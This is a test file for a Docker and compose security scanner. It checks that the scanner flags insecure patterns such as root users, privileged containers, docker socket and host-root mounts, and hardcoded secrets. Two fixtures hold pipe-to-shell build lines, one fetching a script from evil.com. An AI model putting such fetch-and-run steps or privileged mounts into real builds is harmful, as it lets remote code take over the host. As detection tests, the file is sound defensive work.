import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs-extra';
import path from 'path';
import os from 'os';
import { scanDocker } from '../src/scanners/docker-scanner.ts';

async function makeTempDir(): Promise<string> {
  return fs.mkdtemp(path.join(os.tmpdir(), 'mcp-docker-test-'));
}

describe('docker-scanner', () => {
  it('detects container running as root', async () => {
    const tmpDir = await makeTempDir();
    try {
      const dockerfile = `FROM node:20
RUN npm install
USER root
CMD ["node", "server.js"]`;
      await fs.writeFile(path.join(tmpDir, 'Dockerfile'), dockerfile);

      const result = await scanDocker(tmpDir);
      assert.ok(result.issues.some(i => i.title === 'Container Runs as Root' && i.type === 'high'));
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('warns when no USER directive exists', async () => {
    const tmpDir = await makeTempDir();
    try {
      const dockerfile = `FROM node:20-alpine
RUN npm install
CMD ["node", "server.js"]`;
      await fs.writeFile(path.join(tmpDir, 'Dockerfile'), dockerfile);

      const result = await scanDocker(tmpDir);
      assert.ok(result.issues.some(i => i.title === 'No USER Directive' && i.type === 'medium'));
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('detects :latest tag', async () => {
    const tmpDir = await makeTempDir();
    try {
      const dockerfile = `FROM node:latest
USER appuser
CMD ["node", "server.js"]`;
      await fs.writeFile(path.join(tmpDir, 'Dockerfile'), dockerfile);

      const result = await scanDocker(tmpDir);
      assert.ok(result.issues.some(i => i.title === 'Floating Image Tag (:latest)' && i.type === 'medium'));
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('detects curl | sh pattern', async () => {
    const tmpDir = await makeTempDir();
    try {
      const dockerfile = `FROM alpine:3.18
RUN curl https://example.com/install.sh | sh
USER appuser`;
      await fs.writeFile(path.join(tmpDir, 'Dockerfile'), dockerfile);

      const result = await scanDocker(tmpDir);
      assert.ok(result.issues.some(i => i.title === 'Pipe to Shell in Build' && i.type === 'high'));
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('detects hardcoded secrets in Dockerfile', async () => {
    const tmpDir = await makeTempDir();
    try {
      const dockerfile = `FROM alpine:3.18
ENV API_KEY=sk-12345abcdef
USER appuser`;
      await fs.writeFile(path.join(tmpDir, 'Dockerfile'), dockerfile);

      const result = await scanDocker(tmpDir);
      assert.ok(result.issues.some(i => i.title === 'Hardcoded Secret in Dockerfile' && i.type === 'high'));
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('detects privileged service in docker-compose', async () => {
    const tmpDir = await makeTempDir();
    try {
      const compose = `
version: "3"
services:
  app:
    image: myapp:1.0
    privileged: true
`;
      await fs.writeFile(path.join(tmpDir, 'docker-compose.yml'), compose);

      const result = await scanDocker(tmpDir);
      assert.ok(result.issues.some(i => i.title === 'Privileged Container' && i.type === 'high'));
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('detects docker socket mount in compose', async () => {
    const tmpDir = await makeTempDir();
    try {
      const compose = `
version: "3"
services:
  watcher:
    image: watcher:1.0
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
`;
      await fs.writeFile(path.join(tmpDir, 'docker-compose.yml'), compose);

      const result = await scanDocker(tmpDir);
      assert.ok(result.issues.some(i => i.title === 'Docker Socket Mounted' && i.type === 'high'));
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('detects host network mode in compose', async () => {
    const tmpDir = await makeTempDir();
    try {
      const compose = `
services:
  proxy:
    image: nginx:1.25
    network_mode: host
`;
      await fs.writeFile(path.join(tmpDir, 'compose.yml'), compose);

      const result = await scanDocker(tmpDir);
      assert.ok(result.issues.some(i => i.title === 'Host Network Mode' && i.type === 'high'));
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('detects secrets in .env files', async () => {
    const tmpDir = await makeTempDir();
    try {
      const env = `DATABASE_URL=postgres://user:pass@db:5432/mydb
API_KEY=sk-12345
APP_PORT=3000
`;
      await fs.writeFile(path.join(tmpDir, '.env'), env);

      const result = await scanDocker(tmpDir);
      const secretIssues = result.issues.filter(i => i.title === 'Secret in .env File');
      assert.ok(secretIssues.length >= 1, `Expected at least 1 secret issue, got ${secretIssues.length}`);
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('returns high score for secure config', async () => {
    const tmpDir = await makeTempDir();
    try {
      const dockerfile = `FROM node:20.11-alpine
RUN adduser --disabled-password appuser
COPY . /app
WORKDIR /app
RUN npm ci --production
USER appuser
HEALTHCHECK CMD wget -qO- http://localhost:3000/health || exit 1
CMD ["node", "server.js"]`;
      await fs.writeFile(path.join(tmpDir, 'Dockerfile'), dockerfile);

      const result = await scanDocker(tmpDir);
      assert.ok(result.score > 70, `Expected score > 70, got ${result.score}`);
    } finally {
      await fs.remove(tmpDir);
    }
  });

  it('scores low for many issues', async () => {
    const tmpDir = await makeTempDir();
    try {
      const dockerfile = `FROM node:latest
ENV SECRET_KEY=supersecret
RUN curl https://evil.com/install.sh | sh
RUN apt-get install stuff
EXPOSE 80
CMD ["node", "server.js"]`;
      await fs.writeFile(path.join(tmpDir, 'Dockerfile'), dockerfile);

      const compose = `
services:
  app:
    image: myapp:latest
    privileged: true
    network_mode: host
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - /:/host
`;
      await fs.writeFile(path.join(tmpDir, 'docker-compose.yml'), compose);

      const result = await scanDocker(tmpDir);
      assert.ok(result.score < 30, `Expected score < 30, got ${result.score}`);
      assert.ok(result.summary.highRiskIssues >= 4, `Expected >= 4 high issues, got ${result.summary.highRiskIssues}`);
    } finally {
      await fs.remove(tmpDir);
    }
  });
});
